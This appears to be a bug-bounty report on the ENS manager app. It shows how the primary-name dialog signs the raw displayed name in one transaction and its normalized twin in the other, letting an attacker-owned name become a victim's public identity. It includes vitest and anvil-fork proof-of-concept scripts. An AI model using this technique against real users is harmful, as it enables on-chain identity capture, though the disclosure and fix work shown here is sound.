# 91722 w a critical choosing a primary name claims the ensip 15 normalized twin of the displayed row handing the victim s on chain identity to whoever owns that twin

**Submitted on Sep 3rd 2026 at 20:49:41 UTC by @SaiyanVegeta for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91722
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

## Description

## Bug Description

**Brief.** A single confirmation in the "choose your primary name" dialog signs **two different ENS names**. The forward leg writes the address record on the node of the name shown in the row; the reverse leg tells the reverse registrar a *normalized* name that may belong to somebody else. For a name whose raw form is not ENSIP-15 canonical, the victim's address ends up publicly resolving to an attacker-owned name.

**Details (verified at HEAD).**

*One value, displayed and selected — RAW:*

* `apps/manager/src/features/dashboard/components/ChoosePrimaryNameDialog.tsx:81` — `const label = resolveDomainLabel(domain)`.
* `apps/manager/src/features/dashboard/utils.ts:42-46` — `resolveDomainLabel = (domain) => domain.name ?? domain.normalizedName ?? domain.id`. The indexer's **raw** `name` is preferred over the indexer's own `normalizedName` field. `apps/manager/src/features/dashboard/utils.test.ts` pins this ("should prefer name over normalizedName"), so it is deliberate.
* That same `label` is the rendered row text (`{label}`), the `aria-label`, the avatar seed, and the value passed to `onSelectName(label)` → `setSelectedName(name)`. There is exactly one `selectedName` state.

*Leg A — forward record, RAW:* `runConfirm` calls `saveRecords({ name: selectedName, … })` (or `setupControlledResolver({ name: selectedName, … })` when resolver write access is missing). No normalization on that path: the name flows to `features/profile/service/profileRecordTransactions.ts` → `setRecordsWriteParameters({ name })` → ensjs → `namehash(RAW)`.

*Leg B — reverse claim, NORMALIZED:* The **same** `selectedName`, in the **same** `runConfirm`, goes to `submitPrimaryName({ name: selectedName, owner })` → `features/profile/service/setPrimaryName.ts`, whose first act is:

```ts
// setPrimaryName.ts:46-49
// Normalized claim string: a non-canonical name would fail the bidirectional
// check at resolution time and read as "no primary name".
const withEthSuffix = (name: string) =>
  normalize(name.endsWith('.eth') ? name : `${name}.eth`)
```

`cleanName` then becomes the argument of `setNameWithHCA(ownerAddress, cleanName)` (HCA path, line 163) or `setName(cleanName)` (EOA path, lines 241 and 326).

**The developers normalized one leg because they understood the hazard — and the sibling leg in the same confirmation was left raw.** Nothing anywhere asserts `selectedName === withEthSuffix(selectedName)`, and the dialog applies no normalization filter to the rows it lists (the query filters on `owner` only; every returned domain is rendered).

***

## Impact

The victim clicks a row reading `Alice.eth` and confirms once. Two transactions are produced from that one click:

1. the address record is written on `namehash("Alice.eth")` — their own node;
2. the reverse registry is told their primary name is `alice.eth` — **a different node, which the attacker owns**.

Because the attacker owns `alice.eth`, they can point its `addr(60)` at the victim, so the reverse record **forward-verifies** under ENSIP-3 and displays everywhere. From that moment the victim's wallet address is publicly named by a name the attacker fully controls — including its avatar, description and, at any time, what it resolves to. Every ENS-aware wallet, explorer and dapp shows the victim under the attacker's identity.

Bounding this honestly: no funds move in this flow, and no approval is granted. The loss is the victim's **on-chain identity**, plus the fact that the primary name they believe they set was never set.

***

## Risk Breakdown

**This is not the profile-page resolution issue, and not the renewal label issue — stated first, because they are easy to conflate.** Those are single-value divergences on a lookup or a renewal label. This one is structurally different: **one value, one confirmation, two signed transactions that disagree with each other**, one of which is *correctly* normalized. The fix locus is `ChoosePrimaryNameDialog.tsx` / `resolveDomainLabel` (make the selected value canonical, or reject non-canonical rows) — a file no renewal or profile-records patch touches. Patching either of those leaves this dialog signing exactly as it does today.

* **Attacker-controlled trigger.** The attacker registers `alice` (the normalized form) directly against the registrar — permissionless, and the registrar accepts non-normalized labels too (proven separately on the real deployed contract). They then transfer the raw twin `Alice.eth` to the victim; an ERC-721/1155 `transferFrom` to an EOA needs no acceptance from the recipient, so this requires zero victim interaction. The dashboard lists names by owner, so the row appears. The victim's only action is the ordinary one: pick a primary name.
* **The indexer serves both fields honestly.** `Domain.name` and `Domain.normalizedName` are two distinct fields in the repo's own generated schema, the e2e mock indexer populates both, and `NamesTable.tsx` documents in prose that the display name "may be unnormalized … and would hash to the wrong label". This is not a lying-oracle assumption.
* **Not EXP-INPUT-005.** That known issue covers validators that "accept inputs that ENS normalization later rejects or transforms", and it scopes itself explicitly to display confusion **"rather than incorrect resolution"**. This report fails that test in the literal sense the clause sets: nothing here is a rendering artefact — the app *resolves and writes two different registry nodes*, and the on-chain reverse record ends up naming a third party's node (PoC 3 and PoC 4 read it back). The fix is also not in a validator; it is in `resolveDomainLabel` / the dialog's selection.
* **Not QA-06.** That known issue is about **staleness**: a subname set as primary while resolving, which later stops resolving and is *still displayed*. Its root cause is a missing re-check of a name the user legitimately chose, its harm is a stale display, and its fix is to re-validate resolution over time. Here the wrong name is claimed **at signing time**, for a node the user never selected and does not own, and no amount of re-checking resolution would help — the two legs disagree the moment the confirmation is signed. Different root cause, different harm, disjoint fix locus.
* **Both production paths execute.** The EOA path and the HCA path were each run on a fork of the real deployed contracts (PoC 3 and PoC 4). The adapter's authorization check gates **who may call**, never **which name is passed** — demonstrated, not asserted.
* **Severity Critical (the program's tier).** The matched impact is listed under Critical. I note honestly that no funds move in this flow; the harm is identity capture plus a silently-unset primary name.

***

## Recommendation

1. Make the selected value canonical at the boundary: in `resolveDomainLabel`, prefer `domain.normalizedName` over `domain.name`, or normalize once in `ChoosePrimaryNameDialog` before `setSelectedName`.
2. Or refuse the row: if `domain.name !== domain.normalizedName`, either omit it from the picker or render it with an explicit warning, and block confirmation.
3. Minimally, assert agreement before signing: `selectedName === withEthSuffix(selectedName)`, throwing otherwise — the two legs must never be allowed to disagree.
4. Consider making `withEthSuffix` (or an equivalent) the single entry point for *every* name that reaches a transaction in this app, so a future caller cannot re-introduce the split.

***

## References

* `apps/manager/src/features/dashboard/components/ChoosePrimaryNameDialog.tsx:81, 96, 116, 228, 278, 445, 449-475`
* `apps/manager/src/features/dashboard/utils.ts:42-46` (`resolveDomainLabel`, raw preferred) and its test pinning that preference
* `apps/manager/src/features/profile/service/setPrimaryName.ts:46-49` (`withEthSuffix` = viem `normalize`), `:163` (`setNameWithHCA`), `:241`, `:326` (`setName`)
* `apps/manager/src/features/profile/service/profileRecordTransactions.ts:446` (`setRecordsWriteParameters`, raw name → `namehash`)
* `packages/smart-account/src/providers/rhinestone/manifest.ts:104,107` (HCA implementation, reverse adapter)

***

## Proof of Concept

## Proof of Concept

### PoC 1 — the two legs address different nodes (vitest, the app's real function, 4/4 pass)

Drop into `apps/manager/src/audit/` and run `npx vitest run src/audit/primary-name-divergence.test.ts` from `apps/manager`.

```ts
import { describe, expect, it } from 'vitest'
import { encodeFunctionData, namehash, parseAbi } from 'viem'
import { normalize } from 'viem/ens'
import { resolveDomainLabel } from '@/features/dashboard/utils'

// setPrimaryName.ts:48-49, verbatim
const withEthSuffix = (name: string) =>
  normalize(name.endsWith('.eth') ? name : `${name}.eth`)

const reverseAdapterAbi = parseAbi(['function setNameWithHCA(address addr, string name)'])
const VICTIM = '0x1111111111111111111111111111111111111111' as const

// indexer rows exactly as Domain.graphql serves them
const ROWS = [
  { kind: 'mixed case',  id: '0xid1', name: 'Nick.eth',  normalizedName: 'nick.eth' },
  { kind: 'fullwidth',   id: '0xid2', name: 'Ｎick.eth', normalizedName: 'nick.eth' },
  { kind: 'soft hyphen', id: '0xid3', name: 'ni­ck.eth', normalizedName: 'nick.eth' },
] as const

describe('ChoosePrimaryNameDialog: forward leg raw, reverse leg normalized', () => {
  it.each(ROWS)('$kind — one confirmation, two different nodes', (row) => {
    const label = resolveDomainLabel(row)
    expect(label).toBe(row.name)                     // raw preferred over normalizedName

    const forwardNode = namehash(label)              // saveRecords -> namehash(raw)
    const reverseName = withEthSuffix(label)         // submitPrimaryName -> normalize
    const reverseNode = namehash(reverseName)

    expect(reverseName).not.toBe(label)
    expect(reverseNode).not.toBe(forwardNode)
    expect(reverseName).toBe(row.normalizedName)     // a node the victim may not own

    const calldata = encodeFunctionData({
      abi: reverseAdapterAbi, functionName: 'setNameWithHCA', args: [VICTIM, reverseName],
    })
    expect(calldata).toContain(Buffer.from(reverseName).toString('hex'))
  })

  it('a canonical row is unaffected (no false positive)', () => {
    const row = { id: '0xid9', name: 'nick.eth', normalizedName: 'nick.eth' }
    const label = resolveDomainLabel(row)
    expect(withEthSuffix(label)).toBe(label)
  })
})
```

Result: `Test Files 1 passed · Tests 4 passed`.

### PoC 2 — attacker pre-positioning is possible on the real registrar

The attacker must own the normalized twin and the victim must hold the raw one. Both are registrable: against the real deployed v2 registrar on a Sepolia fork, `isAvailable` returns `true` and `register()` succeeds for uppercase / fullwidth / soft-hyphen / zero-width-space / FE0F labels. (Same harness as PoC 3; the registration step prints `registered "Nick……eth" -> VICTIM` and `registered "nick……eth" -> ATTACKER`.)

### PoC 3 — EOA path, end-to-end on the real deployed contracts

A single self-contained Node script, run against `anvil --silent --port 8545 --chain-id 11155111 --fork-url <any Sepolia RPC>`. It embeds byte-exact copies of `resolveDomainLabel` and `withEthSuffix`, registers both names against the real deployed v2 registrar, has the attacker point the twin's `addr(60)` at the victim, then runs the reverse leg and reads the record back. All writes are served by the local fork; nothing is sent to Sepolia. The full run output follows; **the script itself is available on request** (the submission form does not accept `.mjs` attachments).

```
=== what the dialog computes from ONE row ===
resolveDomainLabel(row)      : "Nick466032.eth"   <- rendered, aria-label, avatar, onSelectName
  (indexer also served normalizedName = "nick466032.eth", which is IGNORED)
FORWARD leg  saveRecords()   : namehash("Nick466032.eth") = 0xf41aa0b52e93
REVERSE leg  withEthSuffix() : "nick466032.eth"  namehash = 0xa8992dcbdb4f
  the two legs address DIFFERENT nodes : true

registered "Nick466032.eth" -> VICTIM   (the row they see)
registered "nick466032.eth" -> ATTACKER (the normalized twin)
attacker set addr(60) of "nick466032.eth" -> the VICTIM's address (forward-verification bait)

=== VARIANT A — EOA path (submitPrimaryNameForward) ===
calldata decodes to : setName("nick466032.eth")
  the user clicked  : "Nick466032.eth"
  reverse record before : ""
  reverse record after  : "nick466032.eth"
  => victim address is now publicly named "nick466032.eth" (the ATTACKER's name)
```

### PoC 4 — HCA path, end-to-end on the real deployed adapter

The production HCA call is `DefaultReverseRegistrarAdapter.setNameWithHCA(owner, cleanName)`, executed inside a Rhinestone intent by the victim's HCA smart account. The Rhinestone orchestrator is third-party infrastructure and out of scope, so instead of driving it the script **impersonates the victim's real HCA with anvil** and emits the identical calldata. The HCA address is derived with the app's own `computeStandaloneHcaAddress` derivation and confirmed by the factory (`authorizedOwnerOf(hca) == victim`). This one is short enough to inline in full:

```js
// run against: anvil --silent --port 8545 --chain-id 11155111 --fork-url <Sepolia RPC>
import { createPublicClient, createWalletClient, createTestClient, http,
         encodeFunctionData, decodeFunctionData, parseAbi, namehash } from 'viem'
import { normalize } from 'viem/ens'
import { sepolia } from 'viem/chains'

const RPC = 'http://127.0.0.1:8545'
const chain = { ...sepolia, rpcUrls: { default: { http: [RPC] }, public: { http: [RPC] } } }
const pub = createPublicClient({ chain, transport: http(RPC) })
const tst = createTestClient({ chain, transport: http(RPC), mode: 'anvil' })

const VICTIM  = '0x70997970C51812dc3A010C7d01b50e0d17dc79C8'   // anvil #1
const HCA     = '0x6cf3a049E11405d1e101F08D3234d26c9ACbA425'   // computeStandaloneHcaAddress(VICTIM)
const ADAPTER = '0x7a84e241f862D73960D73c26d68c3C8F89F0B18F'   // DefaultReverseRegistrarAdapter
const REVREG  = '0x4F382928805ba0e23B30cFB75fC9E848e82DFD47'   // DefaultReverseRegistrar

// apps/manager/src/features/dashboard/utils.ts:42-46
const resolveDomainLabel = d => d.name ?? d.normalizedName ?? d.id
// apps/manager/src/features/profile/service/setPrimaryName.ts:48-49
const withEthSuffix = n => normalize(n.endsWith('.eth') ? n : `${n}.eth`)

const ADAPTER_ABI = parseAbi(['function setNameWithHCA(address addr, string name)'])
const REV_ABI     = parseAbi(['function nameForAddr(address addr) view returns (string)'])

const ts  = String(Math.floor(Date.now() / 1000)).slice(-6)
const row = { id: '0xrow', name: `Nick${ts}.eth`, normalizedName: `nick${ts}.eth` }
const displayed = resolveDomainLabel(row)    // what the row renders and stores
const cleanName = withEthSuffix(displayed)   // what BOTH reverse legs sign

console.log('clicked :', displayed, '| signed :', cleanName,
            '| different nodes :', namehash(displayed) !== namehash(cleanName))

const data = encodeFunctionData({ abi: ADAPTER_ABI, functionName: 'setNameWithHCA',
                                  args: [VICTIM, cleanName] })
const read = () => pub.readContract({ address: REVREG, abi: REV_ABI,
                                      functionName: 'nameForAddr', args: [VICTIM] })

const before = await read()
await tst.impersonateAccount({ address: HCA })          // stands in for the orchestrator
await tst.setBalance({ address: HCA, value: 10n ** 18n })
const hash = await createWalletClient({ account: HCA, chain, transport: http(RPC) })
  .sendTransaction({ to: ADAPTER, data })
await pub.waitForTransactionReceipt({ hash })
await tst.stopImpersonatingAccount({ address: HCA })
const after = await read()

console.log('reverse record before :', JSON.stringify(before))
console.log('reverse record after  :', JSON.stringify(after))
console.log('name written != name clicked :', after !== displayed)
console.log('name written == normalized twin :', after === cleanName)
```

```
victim EOA : 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
victim HCA : 0x6cf3a049E11405d1e101F08D3234d26c9ACbA425 (factory-verified authorizedOwnerOf == victim)

production calldata : setNameWithHCA(0x7099…79C8, "nick466737.eth")

  call sent from the victim's real HCA : SUCCESS
  reverse record before : ""
  reverse record after  : "nick466737.eth"

ASSERTIONS:
  caller is the factory-recognised HCA of the victim : true
  the production call SUCCEEDED                      : true
  name written != name the user clicked              : true
  name written == the ENSIP-15 normalized twin       : true
```

This closes the obvious objection: the adapter's authorization check constrains **who may call**, never **which name is passed**. With a legitimate caller the divergent name lands exactly as it does on the EOA path — demonstrated, not argued.
